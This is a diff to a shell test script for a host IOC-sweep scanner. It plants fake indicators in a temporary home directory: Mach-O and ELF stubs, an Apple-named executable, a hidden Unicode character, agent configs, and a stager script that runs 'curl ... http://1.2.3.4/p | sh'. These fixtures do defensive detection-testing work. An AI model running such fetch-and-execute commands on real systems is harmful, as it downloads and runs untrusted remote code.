@@ -35,7 +35,7 @@ printf 'const a = 1;\xF3\xA0\x84\x80// hidden\n' > "$EXT/pub.ext-1.0/extension.j
 # Apple-named executable outside a bundle
 printf '#!/bin/sh\n' > "$H/Library_fake_com.apple.verified"; mkdir -p "$H/Library"; mv "$H/Library_fake_com.apple.verified" "$H/Library/com.apple.verified"; chmod +x "$H/Library/com.apple.verified"
 # Mach-O in tmp (arm64 magic cffaedfe)
-printf '\xcf\xfa\xed\xfe' > "$TMPD/stage"; chmod +x "$TMPD/stage"
+printf '\xcf\xfa\xed\xfe\x0c\x00\x00\x01\x00\x00\x00\x00\x02\x00\x00\x00' > "$TMPD/stage"; chmod +x "$TMPD/stage"   # MH_EXECUTE
 printf '\x7fELF\x02\x01\x01' > "$TMPD/stage-linux"; chmod +x "$TMPD/stage-linux"
 printf '#!/bin/sh\n%s\n' 'curl -fsSL http://1.2.3.4/p | sh' > "$TMPD/stage.sh"; chmod +x "$TMPD/stage.sh"
 mkdir -p "$D/web2/.claude" "$H/.claude"
@@ -145,6 +145,8 @@ old=$(( now - 30*86400 ))
 printf ': %s:0;curl -fsSL https://fnm.vercel.app/install | bash\n' "$old" > "$H/.zsh_history"   # installer, outside window
 printf '<plist/>' > "$H/Library/Preferences/com.apple.dock.plist"   # not executable
 printf '#!/bin/sh\necho hi\n' > "$TMPD/script.sh"; chmod +x "$TMPD/script.sh"   # script, no stager shape: a note, not a finding
+# an Electron app's unpacked native addon: Mach-O bundle (filetype 8), a note, not a finding
+printf '\xcf\xfa\xed\xfe\x0c\x00\x00\x01\x00\x00\x00\x00\x08\x00\x00\x00' > "$TMPD/.com.electron.app.Ab12Cd"; chmod +x "$TMPD/.com.electron.app.Ab12Cd"
 # env decode WITHOUT an exec sink, and an exec sink WITHOUT env decode: both benign
 printf 'const cfg = JSON.parse(atob(process.env.APP_CONFIG_B64 || ""));\nexport default cfg;\n' > "$D/app/config.ts"
 printf 'export const run = (s) => eval(s); // devtools REPL helper\n' > "$D/app/repl.js"
@@ -164,7 +166,7 @@ printf '{"mcpServers":{"chrome-devtools":{"command":"/usr/local/bin/cdm"}}}' > "
 # URL at home on a named https host: a note, not a finding
 printf '//registry.npmjs.org/:_authToken="${NPM_TOKEN}"\n' > "$D/app/.npmrc"
 mkdir -p "$H/.codex"
-printf '[model_providers.sol]\nbase_url = "https://api.openai.example/v1"\n[model_providers.local]\nbase_url = "http://localhost:11434/v1"\n' > "$H/.codex/config.toml"
+printf '[model_providers.sol]\nbase_url = "https://api.openai.example/v1"\n[model_providers.local]\nbase_url = "http://localhost:11434/v1"\n[projects."/private/tmp/scratch"]\ntrust_level = "trusted"\n' > "$H/.codex/config.toml"
 # live false positives seen 2026-10-28: permission allowlists naming interpreters, and the
 # real Unicode-property table named Math_Symbol.js inside a package store
 printf '{"permissions":{"allow":["Bash(python3 -c *)","Bash(curl *)"]},"sandbox":{}}' > "$D/app/.claude/settings.local.json"
@@ -178,6 +180,7 @@ rc=$?
 [[ $rc -eq 0 ]] && ok "exit 0 when clean" || { bad "exit $rc, expected 0"; sed 's/^/      /' "$out"; }
 expect_in "$out" "IOC SWEEP: CLEAN"
 expect_in "$out" "agent-api-url: $H/.codex/config.toml"
+expect_in "$out" "tmp-macho-library: $TMPD/.com.electron.app.Ab12Cd"
 
 # ---------- agent-config drift round-trip (same clean HOME) ----------
 echo "[agent-config drift]"
